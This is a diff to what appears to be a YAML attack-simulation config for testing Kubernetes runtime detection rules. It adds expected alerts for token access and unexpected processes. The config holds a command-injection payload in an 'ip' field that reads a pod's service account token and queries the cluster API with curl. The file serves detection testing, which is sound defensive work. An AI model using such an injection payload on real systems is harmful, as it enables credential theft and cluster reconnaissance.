@@ -527,7 +527,16 @@ attacks:
         ip: "127.0.0.1;TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/webapp/pods 2>&1 | head -20 || echo k8s_enum_failed"
     successIndicators:
       - statusCode: 200
+    # Reads the SA token (R0006) and execs cat + curl (R0001 for both).
     expectedDetections:
+      - ruleID: R0006
+        ruleName: Unexpected Service Account Token Access
+        containerName: mywebapp-app
+        command: cat
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: cat
       - ruleID: R0001
         ruleName: Unexpected process launched
         containerName: mywebapp-app
